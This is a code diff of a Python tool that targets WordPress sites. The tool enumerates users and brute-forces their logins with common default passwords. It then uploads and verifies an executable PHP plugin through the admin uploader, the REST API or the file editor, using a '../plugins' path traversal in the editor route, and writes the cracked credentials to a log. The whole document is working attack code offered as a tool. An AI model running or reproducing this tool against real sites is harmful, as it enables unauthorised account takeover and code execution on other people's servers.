@@ -99,22 +99,6 @@ def get_random_user_agent():
     """Return a random user agent from the list"""
     return random.choice(USER_AGENTS)
 
-def get_wp_base_path(login_path):
-    """Extract WordPress base path from login path"""
-    # Remove wp-login.php and trailing slash to get base path
-    if login_path.endswith('/wp-login.php'):
-        base_path = login_path[:-13]  # Remove '/wp-login.php'
-    elif login_path.endswith('/login.php'):
-        base_path = login_path[:-10]  # Remove '/login.php'
-    else:
-        base_path = ''
-    
-    # Ensure base path starts with / if not empty
-    if base_path and not base_path.startswith('/'):
-        base_path = '/' + base_path
-        
-    return base_path
-
 def print_status(message, status='info'):
     """Print status messages with color coding and timestamp"""
     status_colors = {
@@ -128,16 +112,14 @@ def print_status(message, status='info'):
     print(f"[{timestamp}] {color}[{status.upper()}]{Style.RESET_ALL} {message}")
 
 def create_test_plugin_zip():
-    """Create a test plugin ZIP file in memory"""
-    zip_buffer = io.BytesIO()
-    
-    # Plugin main file content
+    """Create a test WordPress plugin ZIP file in memory"""
+    # Create the plugin content
     plugin_content = '''<?php
 /**
  * Plugin Name: Kishore Test Plugin
  * Description: Simple test plugin for security testing
  * Version: 1.0
- * Author: Test Author
+ * Author: Security Tester
  */
 
 // Prevent direct access
@@ -145,43 +127,318 @@ if (!defined('ABSPATH')) {
     exit;
 }
 
-// Simple test function
-function kishore_test_function() {
-    return "Hello from Kishore plugin!";
-}
-
-// Add a simple admin notice
-add_action('admin_notices', function() {
-    echo '<div class="notice notice-success"><p>Kishore Test Plugin is active!</p></div>';
-});
-?>'''
-
-    # Hello world PHP file
-    hello_content = '''<?php
-// Simple hello world file for testing
-if (!defined('ABSPATH')) {
-    exit;
-}
-
+// Simple output for verification
 echo "kishoriya";
+
+// Add admin menu for testing
+add_action('admin_menu', 'kishore_add_admin_menu');
+
+function kishore_add_admin_menu() {
+    add_options_page('Kishore Test', 'Kishore Test', 'manage_options', 'kishore-test', 'kishore_admin_page');
+}
+
+function kishore_admin_page() {
+    echo '<div class="wrap"><h1>Kishore Test Plugin</h1><p>This is a test plugin for security assessment.</p></div>';
+}
 ?>'''
 
-    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
-        # Add main plugin file
-        zipf.writestr('kishore/kishore.php', plugin_content)
-        # Add hello.php test file
-        zipf.writestr('kishore/hello.php', hello_content)
-        # Add readme
-        zipf.writestr('kishore/readme.txt', 'Test plugin for security assessment')
+    # Create ZIP file in memory
+    zip_buffer = io.BytesIO()
+    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
+        # Create directory structure
+        zip_file.writestr('kishore/hello.php', plugin_content)
+        zip_file.writestr('kishore/readme.txt', '''=== Kishore Test Plugin ===
+Contributors: securitytester
+Tags: test, security
+Requires at least: 4.0
+Tested up to: 6.0
+Stable tag: 1.0
+License: GPL v2 or later
+
+A simple test plugin for security assessment purposes.
+
+== Description ==
+
+This is a test plugin used for security assessment. It contains minimal functionality.
+
+== Installation ==
+
+1. Upload the plugin files to the `/wp-content/plugins/kishore` directory.
+2. Activate the plugin through the 'Plugins' screen in WordPress.
+
+== Changelog ==
+
+= 1.0 =
+* Initial release
+''')
     
     zip_buffer.seek(0)
     return zip_buffer.getvalue()
 
+def get_wp_base_path(login_path):
+    """Extract WordPress base path from login path"""
+    if login_path == '/wp-login.php':
+        return ''
+    else:
+        return login_path.replace('/wp-login.php', '')
+
 def write_plugin_upload_success(upload_output_file, url, username, password, upload_method, plugin_url):
-    """Write successful plugin upload to separate file with timestamp"""
+    """Write successful plugin upload to file with timestamp"""
     timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
     with open(upload_output_file, 'a') as f:
-        f.write(f"[{timestamp}] {url} - {username}:{password} - Method: {upload_method} - Plugin URL: {plugin_url}\n")
+        f.write(f"[{timestamp}] {url} - {username}:{password} - {upload_method} - {plugin_url}\n")
+
+async def async_test_plugin_upload(url, login_path, username, password, timeout, session, upload_output_file):
+    """Test plugin upload capabilities using multiple methods with asyncio"""
+    upload_methods_tested = []
+    successful_uploads = []
+
+    # Get WordPress base path for correct URL construction
+    wp_base_path = get_wp_base_path(login_path)
+
+    try:
+        login_url = f"{url}{login_path}"
+        
+        # Prepare login data
+        login_data = {
+            'log': username,
+            'pwd': password,
+            'wp-submit': 'Log In',
+            'testcookie': '1'
+        }
+
+        # Attempt login
+        headers = {
+            'User-Agent': get_random_user_agent(),
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Referer': login_url
+        }
+
+        async with session.post(login_url, data=login_data, headers=headers,
+                             allow_redirects=True, timeout=timeout, ssl=False) as response:
+            
+            # Check if login was successful
+            if wp_base_path + '/wp-admin/' not in str(response.url) and '/wp-admin/' not in str(response.url):
+                return upload_methods_tested, successful_uploads
+
+            # Method 1: Direct plugin upload via admin interface
+            upload_url = f"{url}{wp_base_path}/wp-admin/plugin-install.php?tab=upload"
+            try:
+                async with session.get(upload_url, timeout=timeout, ssl=False) as upload_page:
+                    if upload_page.status == 200:
+                        upload_text = await upload_page.text()
+                        # Look for nonce in the upload form
+                        nonce_match = re.search(r'name="_wpnonce"\s+value="([^"]+)"', upload_text)
+                        if nonce_match:
+                            nonce = nonce_match.group(1)
+                            
+                            # Create the plugin ZIP
+                            plugin_zip = create_test_plugin_zip()
+                            
+                            # Prepare multipart form data
+                            form_data = aiohttp.FormData()
+                            form_data.add_field('_wpnonce', nonce)
+                            form_data.add_field('_wp_http_referer', f'{wp_base_path}/wp-admin/plugin-install.php?tab=upload')
+                            form_data.add_field('install-plugin-submit', 'Install Now')
+                            form_data.add_field('pluginzip', plugin_zip, filename='kishore.zip', content_type='application/zip')
+                            
+                            # Upload the plugin using correct WordPress path
+                            upload_endpoint = f"{url}{wp_base_path}/wp-admin/update.php?action=upload-plugin"
+                            async with session.post(upload_endpoint, data=form_data, timeout=timeout, ssl=False) as upload_response:
+                                upload_methods_tested.append("Direct Admin Upload")
+                                
+                                if upload_response.status == 200:
+                                    upload_resp_text = await upload_response.text()
+                                    if 'Plugin installed successfully' in upload_resp_text or 'successfully' in upload_resp_text.lower():
+                                        # Test if the plugin file is accessible
+                                        test_url = f"{url}{wp_base_path}/wp-content/plugins/kishore/hello.php"
+                                        async with session.get(test_url, timeout=timeout, ssl=False) as test_response:
+                                            if test_response.status == 200:
+                                                test_resp_text = await test_response.text()
+                                                if 'kishoriya' in test_resp_text:
+                                                    successful_uploads.append(("Direct Admin Upload", test_url))
+                                                    print_status(f"🎉 PLUGIN UPLOAD SUCCESS: {url} - {username}:{password} - Direct Admin Upload - {test_url}", "success")
+                                                    write_plugin_upload_success(upload_output_file, url, username, password, "Direct Admin Upload", test_url)
+            except Exception:
+                upload_methods_tested.append("Direct Admin Upload (Failed)")
+
+            # Method 2: REST API upload (if available)
+            try:
+                rest_upload_url = f"{url}{wp_base_path}/wp-json/wp/v2/plugins"
+                plugin_zip = create_test_plugin_zip()
+                
+                headers_rest = {
+                    'User-Agent': get_random_user_agent(),
+                    'Content-Type': 'application/zip',
+                    'Content-Disposition': 'attachment; filename="kishore.zip"'
+                }
+                
+                async with session.post(rest_upload_url, data=plugin_zip, headers=headers_rest,
+                                      timeout=timeout, ssl=False) as rest_response:
+                    upload_methods_tested.append("REST API Upload")
+                    
+                    if rest_response.status in [200, 201]:
+                        # Test if the plugin file is accessible
+                        test_url = f"{url}{wp_base_path}/wp-content/plugins/kishore/hello.php"
+                        async with session.get(test_url, timeout=timeout, ssl=False) as test_response:
+                            if test_response.status == 200:
+                                test_resp_text = await test_response.text()
+                                if 'kishoriya' in test_resp_text:
+                                    successful_uploads.append(("REST API Upload", test_url))
+                                    print_status(f"🎉 PLUGIN UPLOAD SUCCESS: {url} - {username}:{password} - REST API Upload - {test_url}", "success")
+                                    write_plugin_upload_success(upload_output_file, url, username, password, "REST API Upload", test_url)
+            except Exception:
+                upload_methods_tested.append("REST API Upload (Failed)")
+
+            # Method 3: File manager / direct file upload
+            try:
+                file_manager_urls = [
+                    f"{url}{wp_base_path}/wp-admin/theme-editor.php",
+                    f"{url}{wp_base_path}/wp-admin/plugin-editor.php"
+                ]
+                
+                for fm_url in file_manager_urls:
+                    async with session.get(fm_url, timeout=timeout, ssl=False) as fm_response:
+                        if fm_response.status == 200 and 'wp-login.php' not in str(fm_response.url):
+                            fm_text = await fm_response.text()
+                            if 'theme-editor' in fm_text or 'plugin-editor' in fm_text:
+                                # Try to create plugin via editor
+                                nonce_match = re.search(r'name="_wpnonce"\s+value="([^"]+)"', fm_text)
+                                if nonce_match:
+                                    nonce = nonce_match.group(1)
+                                    
+                                    plugin_content = '''<?php
+/**
+ * Plugin Name: Kishore Test Plugin
+ * Description: Simple test plugin for security testing
+ * Version: 1.0
+ */
+if (!defined('ABSPATH')) exit;
+echo "kishoriya";
+?>'''
+                                    
+                                    # Attempt to create the plugin file
+                                    create_data = {
+                                        '_wpnonce': nonce,
+                                        'action': 'edit-theme-plugin-file',
+                                        'file': '../plugins/kishore/hello.php',
+                                        'newcontent': plugin_content,
+                                        'docs-list': '',
+                                        'submit': 'Update File'
+                                    }
+                                    
+                                    async with session.post(fm_url, data=create_data, timeout=timeout, ssl=False) as create_response:
+                                        upload_methods_tested.append("File Manager Upload")
+                                        
+                                        if create_response.status == 200:
+                                            # Test if the plugin file is accessible
+                                            test_url = f"{url}{wp_base_path}/wp-content/plugins/kishore/hello.php"
+                                            async with session.get(test_url, timeout=timeout, ssl=False) as test_response:
+                                                if test_response.status == 200:
+                                                    test_resp_text = await test_response.text()
+                                                    if 'kishoriya' in test_resp_text:
+                                                        successful_uploads.append(("File Manager Upload", test_url))
+                                                        print_status(f"🎉 PLUGIN UPLOAD SUCCESS: {url} - {username}:{password} - File Manager Upload - {test_url}", "success")
+                                                        write_plugin_upload_success(upload_output_file, url, username, password, "File Manager Upload", test_url)
+                                break
+            except Exception:
+                upload_methods_tested.append("File Manager Upload (Failed)")
+
+    except Exception as e:
+        print_status(f"Error during plugin upload test: {str(e)}", "error")
+
+    return upload_methods_tested, successful_uploads
+
+def test_plugin_upload(url, login_path, username, password, timeout, upload_output_file):
+    """Test plugin upload capabilities using multiple methods"""
+    session = requests.Session()
+    login_url = f"{url}{login_path}"
+    upload_methods_tested = []
+    successful_uploads = []
+
+    # Get WordPress base path for correct URL construction
+    wp_base_path = get_wp_base_path(login_path)
+
+    try:
+        # Get login page first to set cookies
+        headers = {'User-Agent': get_random_user_agent()}
+        session.get(login_url, timeout=timeout, verify=False, headers=headers)
+
+        # Prepare login data
+        login_data = {
+            'log': username,
+            'pwd': password,
+            'wp-submit': 'Log In',
+            'testcookie': '1'
+        }
+
+        # Attempt login
+        headers = {
+            'User-Agent': get_random_user_agent(),
+            'Cookie': 'wordpress_test_cookie=WP Cookie check',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Referer': login_url
+        }
+
+        response = session.post(login_url, data=login_data, headers=headers,
+                             allow_redirects=True, timeout=timeout, verify=False)
+
+        # Check if login was successful
+        if wp_base_path + '/wp-admin/' not in response.url and '/wp-admin/' not in response.url:
+            return upload_methods_tested, successful_uploads
+
+        # Method 1: Direct plugin upload via admin interface
+        upload_url = f"{url}{wp_base_path}/wp-admin/plugin-install.php?tab=upload"
+        try:
+            upload_page = session.get(upload_url, timeout=timeout, verify=False)
+            if upload_page.status_code == 200:
+                # Look for nonce in the upload form
+                nonce_match = re.search(r'name="_wpnonce"\s+value="([^"]+)"', upload_page.text)
+                if nonce_match:
+                    nonce = nonce_match.group(1)
+                    
+                    # Create the plugin ZIP
+                    plugin_zip = create_test_plugin_zip()
+                    
+                    # Prepare multipart form data
+                    files = {
+                        'pluginzip': ('kishore.zip', plugin_zip, 'application/zip')
+                    }
+                    
+                    form_data = {
+                        '_wpnonce': nonce,
+                        '_wp_http_referer': f'{wp_base_path}/wp-admin/plugin-install.php?tab=upload',
+                        'install-plugin-submit': 'Install Now'
+                    }
+                    
+                    # Upload the plugin using correct WordPress path
+                    upload_endpoint = f"{url}{wp_base_path}/wp-admin/update.php?action=upload-plugin"
+                    upload_response = session.post(
+                        upload_endpoint,
+                        data=form_data,
+                        files=files,
+                        timeout=timeout,
+                        verify=False
+                    )
+                    
+                    upload_methods_tested.append("Direct Admin Upload")
+                    
+                    if upload_response.status_code == 200:
+                        if 'Plugin installed successfully' in upload_response.text or 'successfully' in upload_response.text.lower():
+                            # Test if the plugin file is accessible
+                            test_url = f"{url}{wp_base_path}/wp-content/plugins/kishore/hello.php"
+                            test_response = session.get(test_url, timeout=timeout, verify=False)
+                            if test_response.status_code == 200 and 'kishoriya' in test_response.text:
+                                successful_uploads.append(("Direct Admin Upload", test_url))
+                                print_status(f"🎉 PLUGIN UPLOAD SUCCESS: {url} - {username}:{password} - Direct Admin Upload - {test_url}", "success")
+                                write_plugin_upload_success(upload_output_file, url, username, password, "Direct Admin Upload", test_url)
+        except Exception:
+            upload_methods_tested.append("Direct Admin Upload (Failed)")
+
+    except Exception as e:
+        print_status(f"Error during plugin upload test: {str(e)}", "error")
+
+    return upload_methods_tested, successful_uploads
 
 async def async_find_working_login_path(url, timeout, session):
     """Find a working login path using asyncio for faster checking"""
@@ -500,22 +757,12 @@ def enumerate_usernames(url, timeout, delay=0, common_users=None):
 def get_password_list(username, common_passwords=None):
     """Generate password list for a given username"""
     common_suffixes = ['123', '123456', 'admin123', 'admin12345', 'password123', 'admin888', '12345678', '!', '@', '1234', 'P@ssw0rd']
-    
-    # Enhanced default passwords with new additions
-    default_passwords = [
-        'Ab123456', 'Qq123456', 'Aa123456', 'Avfr4bgt5', 'Admin888', 'Admin123', 
-        'Passw0rd', 'Change123', 'P@ssw0rd', 'admin123', 'admin12345', 'password123', 
-        'admin888', '123456', '12345678', 'admin', 'password', 'admin2023', 'admin2024', 'admin2025'
-    ]
+    default_passwords = ['admin123', 'admin12345', 'password123', 'admin888', '123456', '12345678', 'admin', 'password', 'P@ssw0rd', 'admin2023', 'admin2024', 'admin2025', 'Ab123456', 'Qq123456', 'Aa123456', 'Avfr4bgt5', 'Admin888', 'Admin123', 'Passw0rd', 'Change123']
     
     # Start with provided common passwords
     passwords = []
     if common_passwords:
         passwords.extend(common_passwords[:50])  # Limit to top 50 for performance
-    
-    # Add new high-priority passwords first
-    priority_passwords = ['Ab123456', 'Qq123456', 'Aa123456', 'Avfr4bgt5', 'Admin888', 'Admin123', 'Passw0rd', 'Change123', 'P@ssw0rd']
-    passwords.extend(priority_passwords)
     
     # Add username-based passwords
     passwords.append(username)  # The username itself
@@ -617,379 +864,13 @@ def try_login(url, login_path, username, password, timeout, delay=0):
     except requests.RequestException:
         return False
 
-async def async_test_plugin_upload(url, login_path, username, password, timeout, session, upload_output_file):
-    """Test plugin upload capabilities using multiple methods with asyncio"""
-    login_url = f"{url}{login_path}"
-    upload_methods_tested = []
-    successful_uploads = []
-    
-    # Get WordPress base path for correct URL construction
-    wp_base_path = get_wp_base_path(login_path)
-    
-    # First, login to get session cookies
-    cookies = {'wordpress_test_cookie': 'WP Cookie check'}
-    headers = {
-        'User-Agent': get_random_user_agent(),
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'Referer': login_url
-    }
-    
-    login_data = {
-        'log': username,
-        'pwd': password,
-        'wp-submit': 'Log In',
-        'testcookie': '1'
-    }
-
-    try:
-        # Login first
-        async with session.post(login_url, data=login_data, headers=headers, cookies=cookies,
-                             allow_redirects=True, timeout=timeout, ssl=False) as response:
-            response_url_str = str(response.url)
-            if wp_base_path + '/wp-admin/' not in response_url_str and '/wp-admin/' not in response_url_str:
-                return upload_methods_tested, successful_uploads
-            
-            # Method 1: Direct plugin upload via admin interface
-            upload_url = f"{url}{wp_base_path}/wp-admin/plugin-install.php?tab=upload"
-            try:
-                async with session.get(upload_url, timeout=timeout, ssl=False) as upload_page:
-                    if upload_page.status == 200:
-                        upload_text = await upload_page.text()
-                        # Look for nonce in the upload form
-                        nonce_match = re.search(r'name="_wpnonce"\s+value="([^"]+)"', upload_text)
-                        if nonce_match:
-                            nonce = nonce_match.group(1)
-                            
-                            # Create the plugin ZIP
-                            plugin_zip = create_test_plugin_zip()
-                            
-                            # Prepare multipart form data
-                            files = {
-                                'pluginzip': ('kishore.zip', plugin_zip, 'application/zip')
-                            }
-                            
-                            form_data = {
-                                '_wpnonce': nonce,
-                                '_wp_http_referer': f'{wp_base_path}/wp-admin/plugin-install.php?tab=upload',
-                                'install-plugin-submit': 'Install Now'
-                            }
-                            
-                            # Upload the plugin using correct WordPress path
-                            upload_endpoint = f"{url}{wp_base_path}/wp-admin/update.php?action=upload-plugin"
-                            async with session.post(
-                                upload_endpoint,
-                                data=form_data,
-                                files=files,
-                                timeout=timeout,
-                                ssl=False
-                            ) as upload_response:
-                                upload_methods_tested.append("Direct Admin Upload")
-                                
-                                if upload_response.status == 200:
-                                    upload_result = await upload_response.text()
-                                    if 'Plugin installed successfully' in upload_result or 'successfully' in upload_result.lower():
-                                        # Test if the plugin file is accessible
-                                        test_url = f"{url}{wp_base_path}/wp-content/plugins/kishore/hello.php"
-                                        async with session.get(test_url, timeout=timeout, ssl=False) as test_response:
-                                            if test_response.status == 200:
-                                                test_content = await test_response.text()
-                                                if 'kishoriya' in test_content:
-                                                    successful_uploads.append(("Direct Admin Upload", test_url))
-                                                    print_status(f"🎉 PLUGIN UPLOAD SUCCESS: {url} - {username}:{password} - Direct Admin Upload - {test_url}", "success")
-                                                    write_plugin_upload_success(upload_output_file, url, username, password, "Direct Admin Upload", test_url)
-            except Exception as e:
-                upload_methods_tested.append("Direct Admin Upload (Failed)")
-            
-            # Method 2: REST API upload (if available)
-            try:
-                rest_upload_url = f"{url}{wp_base_path}/wp-json/wp/v2/plugins"
-                plugin_zip = create_test_plugin_zip()
-                
-                headers_rest = {
-                    'User-Agent': get_random_user_agent(),
-                    'Content-Type': 'application/zip',
-                    'Content-Disposition': 'attachment; filename="kishore.zip"'
-                }
-                
-                async with session.post(
-                    rest_upload_url,
-                    data=plugin_zip,
-                    headers=headers_rest,
-                    timeout=timeout,
-                    ssl=False
-                ) as rest_response:
-                    upload_methods_tested.append("REST API Upload")
-                    
-                    if rest_response.status in [200, 201]:
-                        # Test if the plugin file is accessible
-                        test_url = f"{url}{wp_base_path}/wp-content/plugins/kishore/hello.php"
-                        async with session.get(test_url, timeout=timeout, ssl=False) as test_response:
-                            if test_response.status == 200:
-                                test_content = await test_response.text()
-                                if 'kishoriya' in test_content:
-                                    successful_uploads.append(("REST API Upload", test_url))
-                                    print_status(f"🎉 PLUGIN UPLOAD SUCCESS: {url} - {username}:{password} - REST API Upload - {test_url}", "success")
-                                    write_plugin_upload_success(upload_output_file, url, username, password, "REST API Upload", test_url)
-            except Exception as e:
-                upload_methods_tested.append("REST API Upload (Failed)")
-            
-            # Method 3: File manager / direct file upload (if file manager accessible)
-            try:
-                # Check if file manager or theme editor is available
-                file_manager_urls = [
-                    f"{url}{wp_base_path}/wp-admin/theme-editor.php",
-                    f"{url}{wp_base_path}/wp-admin/plugin-editor.php"
-                ]
-                
-                for fm_url in file_manager_urls:
-                    async with session.get(fm_url, timeout=timeout, ssl=False) as fm_response:
-                        if fm_response.status == 200:
-                            fm_text = await fm_response.text()
-                            if 'wp-login.php' not in str(fm_response.url) and 'theme-editor' in fm_text:
-                                # Try to create plugin via theme editor
-                                nonce_match = re.search(r'name="_wpnonce"\s+value="([^"]+)"', fm_text)
-                                if nonce_match:
-                                    nonce = nonce_match.group(1)
-                                    
-                                    # Create plugin directory and files via theme editor
-                                    plugin_content = '''<?php
-/**
- * Plugin Name: Kishore Test Plugin
- * Description: Simple test plugin for security testing
- * Version: 1.0
- */
-if (!defined('ABSPATH')) exit;
-echo "kishoriya";
-?>'''
-                                    
-                                    # Attempt to create the plugin file
-                                    create_data = {
-                                        '_wpnonce': nonce,
-                                        'action': 'edit-theme-plugin-file',
-                                        'file': '../plugins/kishore/hello.php',
-                                        'newcontent': plugin_content,
-                                        'docs-list': '',
-                                        'submit': 'Update File'
-                                    }
-                                    
-                                    async with session.post(
-                                        fm_url,
-                                        data=create_data,
-                                        timeout=timeout,
-                                        ssl=False
-                                    ) as create_response:
-                                        upload_methods_tested.append("File Manager Upload")
-                                        
-                                        if create_response.status == 200:
-                                            # Test if the plugin file is accessible
-                                            test_url = f"{url}{wp_base_path}/wp-content/plugins/kishore/hello.php"
-                                            async with session.get(test_url, timeout=timeout, ssl=False) as test_response:
-                                                if test_response.status == 200:
-                                                    test_content = await test_response.text()
-                                                    if 'kishoriya' in test_content:
-                                                        successful_uploads.append(("File Manager Upload", test_url))
-                                                        print_status(f"🎉 PLUGIN UPLOAD SUCCESS: {url} - {username}:{password} - File Manager Upload - {test_url}", "success")
-                                                        write_plugin_upload_success(upload_output_file, url, username, password, "File Manager Upload", test_url)
-                                break
-            except Exception as e:
-                upload_methods_tested.append("File Manager Upload (Failed)")
-
-    except Exception as e:
-        print_status(f"Error during plugin upload test: {str(e)}", "error")
-    
-    return upload_methods_tested, successful_uploads
-
-def test_plugin_upload(url, login_path, username, password, timeout, upload_output_file):
-    """Test plugin upload capabilities using multiple methods"""
-    session = requests.Session()
-    login_url = f"{url}{login_path}"
-    upload_methods_tested = []
-    successful_uploads = []
-
-    # Get WordPress base path for correct URL construction
-    wp_base_path = get_wp_base_path(login_path)
-
-    try:
-        # Get login page first to set cookies
-        headers = {'User-Agent': get_random_user_agent()}
-        session.get(login_url, timeout=timeout, verify=False, headers=headers)
-
-        # Prepare login data
-        login_data = {
-            'log': username,
-            'pwd': password,
-            'wp-submit': 'Log In',
-            'testcookie': '1'
-        }
-
-        # Attempt login
-        headers = {
-            'User-Agent': get_random_user_agent(),
-            'Cookie': 'wordpress_test_cookie=WP Cookie check',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Referer': login_url
-        }
-
-        response = session.post(login_url, data=login_data, headers=headers,
-                             allow_redirects=True, timeout=timeout, verify=False)
-
-        # Check if login was successful
-        if wp_base_path + '/wp-admin/' not in response.url and '/wp-admin/' not in response.url:
-            return upload_methods_tested, successful_uploads
-
-        # Method 1: Direct plugin upload via admin interface
-        upload_url = f"{url}{wp_base_path}/wp-admin/plugin-install.php?tab=upload"
-        try:
-            upload_page = session.get(upload_url, timeout=timeout, verify=False)
-            if upload_page.status_code == 200:
-                # Look for nonce in the upload form
-                nonce_match = re.search(r'name="_wpnonce"\s+value="([^"]+)"', upload_page.text)
-                if nonce_match:
-                    nonce = nonce_match.group(1)
-                    
-                    # Create the plugin ZIP
-                    plugin_zip = create_test_plugin_zip()
-                    
-                    # Prepare multipart form data
-                    files = {
-                        'pluginzip': ('kishore.zip', plugin_zip, 'application/zip')
-                    }
-                    
-                    form_data = {
-                        '_wpnonce': nonce,
-                        '_wp_http_referer': f'{wp_base_path}/wp-admin/plugin-install.php?tab=upload',
-                        'install-plugin-submit': 'Install Now'
-                    }
-                    
-                    # Upload the plugin using correct WordPress path
-                    upload_endpoint = f"{url}{wp_base_path}/wp-admin/update.php?action=upload-plugin"
-                    upload_response = session.post(
-                        upload_endpoint,
-                        data=form_data,
-                        files=files,
-                        timeout=timeout,
-                        verify=False
-                    )
-                    
-                    upload_methods_tested.append("Direct Admin Upload")
-                    
-                    if upload_response.status_code == 200:
-                        if 'Plugin installed successfully' in upload_response.text or 'successfully' in upload_response.text.lower():
-                            # Test if the plugin file is accessible
-                            test_url = f"{url}{wp_base_path}/wp-content/plugins/kishore/hello.php"
-                            test_response = session.get(test_url, timeout=timeout, verify=False)
-                            if test_response.status_code == 200 and 'kishoriya' in test_response.text:
-                                successful_uploads.append(("Direct Admin Upload", test_url))
-                                print_status(f"🎉 PLUGIN UPLOAD SUCCESS: {url} - {username}:{password} - Direct Admin Upload - {test_url}", "success")
-                                write_plugin_upload_success(upload_output_file, url, username, password, "Direct Admin Upload", test_url)
-        except Exception:
-            upload_methods_tested.append("Direct Admin Upload (Failed)")
-
-        # Method 2: REST API upload (if available)
-        try:
-            rest_upload_url = f"{url}{wp_base_path}/wp-json/wp/v2/plugins"
-            plugin_zip = create_test_plugin_zip()
-            
-            headers_rest = {
-                'User-Agent': get_random_user_agent(),
-                'Content-Type': 'application/zip',
-                'Content-Disposition': 'attachment; filename="kishore.zip"'
-            }
-            
-            rest_response = session.post(
-                rest_upload_url,
-                data=plugin_zip,
-                headers=headers_rest,
-                timeout=timeout,
-                verify=False
-            )
-            
-            upload_methods_tested.append("REST API Upload")
-            
-            if rest_response.status_code in [200, 201]:
-                # Test if the plugin file is accessible
-                test_url = f"{url}{wp_base_path}/wp-content/plugins/kishore/hello.php"
-                test_response = session.get(test_url, timeout=timeout, verify=False)
-                if test_response.status_code == 200 and 'kishoriya' in test_response.text:
-                    successful_uploads.append(("REST API Upload", test_url))
-                    print_status(f"🎉 PLUGIN UPLOAD SUCCESS: {url} - {username}:{password} - REST API Upload - {test_url}", "success")
-                    write_plugin_upload_success(upload_output_file, url, username, password, "REST API Upload", test_url)
-        except Exception:
-            upload_methods_tested.append("REST API Upload (Failed)")
-
-        # Method 3: File manager / direct file upload
-        try:
-            file_manager_urls = [
-                f"{url}{wp_base_path}/wp-admin/theme-editor.php",
-                f"{url}{wp_base_path}/wp-admin/plugin-editor.php"
-            ]
-            
-            for fm_url in file_manager_urls:
-                fm_response = session.get(fm_url, timeout=timeout, verify=False)
-                if fm_response.status_code == 200 and 'wp-login.php' not in fm_response.url:
-                    if 'theme-editor' in fm_response.text or 'plugin-editor' in fm_response.text:
-                        # Try to create plugin via editor
-                        nonce_match = re.search(r'name="_wpnonce"\s+value="([^"]+)"', fm_response.text)
-                        if nonce_match:
-                            nonce = nonce_match.group(1)
-                            
-                            plugin_content = '''<?php
-/**
- * Plugin Name: Kishore Test Plugin
- * Description: Simple test plugin for security testing
- * Version: 1.0
- */
-if (!defined('ABSPATH')) exit;
-echo "kishoriya";
-?>'''
-                            
-                            # Attempt to create the plugin file
-                            create_data = {
-                                '_wpnonce': nonce,
-                                'action': 'edit-theme-plugin-file',
-                                'file': '../plugins/kishore/hello.php',
-                                'newcontent': plugin_content,
-                                'docs-list': '',
-                                'submit': 'Update File'
-                            }
-                            
-                            create_response = session.post(
-                                fm_url,
-                                data=create_data,
-                                timeout=timeout,
-                                verify=False
-                            )
-                            
-                            upload_methods_tested.append("File Manager Upload")
-                            
-                            if create_response.status_code == 200:
-                                # Test if the plugin file is accessible
-                                test_url = f"{url}{wp_base_path}/wp-content/plugins/kishore/hello.php"
-                                test_response = session.get(test_url, timeout=timeout, verify=False)
-                                if test_response.status_code == 200 and 'kishoriya' in test_response.text:
-                                    successful_uploads.append(("File Manager Upload", test_url))
-                                    print_status(f"🎉 PLUGIN UPLOAD SUCCESS: {url} - {username}:{password} - File Manager Upload - {test_url}", "success")
-                                    write_plugin_upload_success(upload_output_file, url, username, password, "File Manager Upload", test_url)
-                        break
-        except Exception:
-            upload_methods_tested.append("File Manager Upload (Failed)")
-
-    except Exception as e:
-        print_status(f"Error during plugin upload test: {str(e)}", "error")
-
-    return upload_methods_tested, successful_uploads
-
 async def async_check_plugin_access(url, login_path, username, password, timeout, session):
     """Check if the credentials have access to plugins page or wp-plugin.php using asyncio"""
     login_url = f"{url}{login_path}"
-    
-    # Get WordPress base path for correct URL construction
-    wp_base_path = get_wp_base_path(login_path)
-    
     plugin_urls = [
-        f"{url}{wp_base_path}/wp-admin/plugins.php",
-        f"{url}{wp_base_path}/wp-admin/plugin-install.php",
-        f"{url}{wp_base_path}/wp-admin/plugin-editor.php"
+        f"{url}/wp-admin/plugins.php",
+        f"{url}/wp-admin/plugin-install.php",
+        f"{url}/wp-admin/plugin-editor.php"
     ]
     
     # Create a new session for this check
@@ -1012,8 +893,7 @@ async def async_check_plugin_access(url, login_path, username, password, timeout
         # Log in first
         async with session.post(login_url, data=login_data, headers=headers, cookies=cookies,
                              allow_redirects=True, timeout=timeout, ssl=False) as response:
-            response_url_str = str(response.url)
-            if wp_base_path + '/wp-admin/' in response_url_str or '/wp-admin/' in response_url_str:
+            if '/wp-admin/' in str(response.url):
                 # We're logged in, check plugin access
                 plugin_tasks = []
                 for plugin_url in plugin_urls:
@@ -1062,14 +942,10 @@ def check_plugin_access(url, login_path, username, password, timeout):
     """Check if the credentials have access to plugins page or wp-plugin.php"""
     session = requests.Session()
     login_url = f"{url}{login_path}"
-    
-    # Get WordPress base path for correct URL construction
-    wp_base_path = get_wp_base_path(login_path)
-    
     plugin_urls = [
-        f"{url}{wp_base_path}/wp-admin/plugins.php",
-        f"{url}{wp_base_path}/wp-admin/plugin-install.php",
-        f"{url}{wp_base_path}/wp-admin/plugin-editor.php"
+        f"{url}/wp-admin/plugins.php",
+        f"{url}/wp-admin/plugin-install.php",
+        f"{url}/wp-admin/plugin-editor.php"
     ]
 
     try:
@@ -1097,7 +973,7 @@ def check_plugin_access(url, login_path, username, password, timeout):
                              allow_redirects=True, timeout=timeout, verify=False)
 
         # Check if login was successful
-        if wp_base_path + '/wp-admin/' in response.url or '/wp-admin/' in response.url:
+        if '/wp-admin/' in response.url:
             accessible_plugins = []
 
             # Check each plugin URL for access
@@ -1189,7 +1065,7 @@ def load_state(state_file):
         }
 
 async def async_brute_force_users(url, login_path, usernames, timeout, workers, verbose, output_file, 
-                                  upload_output_file, delay=0, state_file=None, max_attempts=50, common_passwords=None):
+                                  delay=0, state_file=None, max_attempts=50, common_passwords=None):
     """Brute force WordPress login for the enumerated usernames using asyncio"""
     if not usernames:
         return []
@@ -1249,18 +1125,17 @@ async def async_brute_force_users(url, login_path, usernames, timeout, workers, 
                         if accessible_plugins:
                             print_status(f"🔌 PLUGIN ACCESS: {url} - {credential} - Access to: {', '.join(accessible_plugins)}", "success")
                             
-                            # Test plugin upload if plugin access is available
